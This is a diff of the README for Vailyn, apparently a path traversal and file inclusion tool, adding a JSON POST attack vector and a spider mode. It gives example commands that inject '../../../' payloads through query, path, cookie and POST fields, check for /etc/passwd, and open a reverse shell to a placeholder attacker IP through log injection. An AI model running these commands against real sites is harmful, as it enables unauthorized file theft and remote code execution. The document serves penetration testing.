@@ -6,7 +6,7 @@
 
 <p align="center">
   <a href="https://github.com/VainlyStrain/Vailyn/blob/master/Vailyn">
-    <img src="https://img.shields.io/static/v1.svg?label=Version&message=3.1&color=lightgrey&style=flat-square"><!--&logo=dev.to&logoColor=white"-->
+    <img src="https://img.shields.io/static/v1.svg?label=Version&message=3.2&color=lightgrey&style=flat-square"><!--&logo=dev.to&logoColor=white"-->
   </a>
   <a href="https://www.python.org/">
     <img src="https://img.shields.io/static/v1.svg?label=Python&message=3.7%2B&color=lightgrey&style=flat-square&logo=python&logoColor=white">
@@ -99,11 +99,11 @@ Vsynta Vailyn -v VIC -a INT -p2 TP P1 P2
 
 mandatory:
   -v VIC, --victim VIC  Target to attack, part 1 [pre-payload]
-  -a INT, --attack INT  Attack type (int, 1-5)
+  -a INT, --attack INT  Attack type (int, 1-5, or A)
 
-    1|;  Query Parameter   4|:  POST Data
-    2|:  Path              5|;  Crawler (automatic)
-    3|;  Cookie
+    A|;  Spider (all)      3|:  Cookie
+    1|:  Query Parameter   4|;  POST Data, plain
+    2|;  Path              5|:  POST Data, json
 
   -p2 TP P1 P2, --phase2 TP P1 P2
                         Attack in Phase 2, and needed parameters
@@ -116,7 +116,7 @@ mandatory:
 └──────┴───────────┴────────────────┘
 
 additional:
-  -p PAM, --param PAM   query parameter or POST data for --attack 1, 4
+  -p PAM, --param PAM   query parameter or POST data for --attack 1, 4, 5
   -i F, --check F       File to check for in Phase 1 (df: /etc/passwd)
   -Pi VIC2, --vic2 VIC2 Attack Target, part 2 [post-payload]
   -c C, --cookie C      Cookie to append (in header format)
@@ -137,7 +137,7 @@ develop:
   --notmain             Avoid notify2 crash in subprocess call.
 ```
 
-Vailyn currently supports 4 attack vectors, and provides a crawler to automate all of them. The attack performed is identified by the `-a INT` argument.
+Vailyn currently supports 5 attack vectors, and provides a crawler to automate all of them. The attack performed is identified by the `-a INT` argument.
 
 ```
 INT        attack
@@ -145,8 +145,9 @@ INT        attack
 1          query-based attack  (https://site.com?file=../../../)
 2          path-based attack   (https://site.com/../../../)
 3          cookie-based attack (will grab the cookies for you)
-4          infected post data  (ELEM1=VAL1&ELEM2=../../../)
-5          spider automation   fetch + analyze all URLs from site
+4          plain post data     (ELEM1=VAL1&ELEM2=../../../)
+5          json post data      ({"file": "../../../"})
+A          spider automation   fetch + analyze all URLs from site with all vectors
 ```
 
 You also must specify a target to attack. This is done via `-v VIC` and `-Pi VIC2`, where -v is the part before the injection point, and -Pi the rest.
@@ -228,22 +229,25 @@ This will shorten the duration of Phase 1 very much, since its a targeted attack
 `$ Vailyn -v "http://site.com/cookiemonster.php" -a 3 -p2 leak dicts/files dicts/dirs`
 Will fetch cookies and you can select cookie you want to poison
 
-* POST Attack:
+* POST Plain Attack:
 `$ Vailyn -v "http://site.com/download.php" -a 4 -p2 leak dicts/files dicts/dirs -p "DATA1=xx&DATA2=INJECT"`
 will infect DATA2 with the payload
+
+* POST JSON Attack:
+`$ Vailyn -v "http://site.com/download.php" -a 5 -p2 leak dicts/files dicts/dirs -p '{"file": "INJECT"}'`
 
 * Attack, but target is behind login screen:
 `$ Vailyn -v "http://site.com/" -a 1 -p2 leak dicts/files dicts/dirs -c "sessionid=foobar"`
 
 * Attack, but I want a reverse shell on port 1337:
-`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 rce MY.IP.IS.XX 1337  # a high Phase 2 Depth would be beneficial`
+`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 rce MY.IP.IS.XX 1337  # a high Phase 2 Depth is needed for log injection`
 (will start a ncat listener for you if on Unix)
 
 * Full automation in crawler mode:
-`$ Vailyn -v "http://root-url.site" -a 5` _you can also specify other args, like cookie, depths, lfi & lookup file here_ 
+`$ Vailyn -v "http://root-url.site" -a A` _you can also specify other args, like cookie, depths, lfi & lookup file here_ 
 
 * Full automation, but Arjun needs `--stable`:
-`$ Vailyn -v "http://root-url.site" -a 5 -s ANY`
+`$ Vailyn -v "http://root-url.site" -a A -s ANY`
 
 ### Demo
 
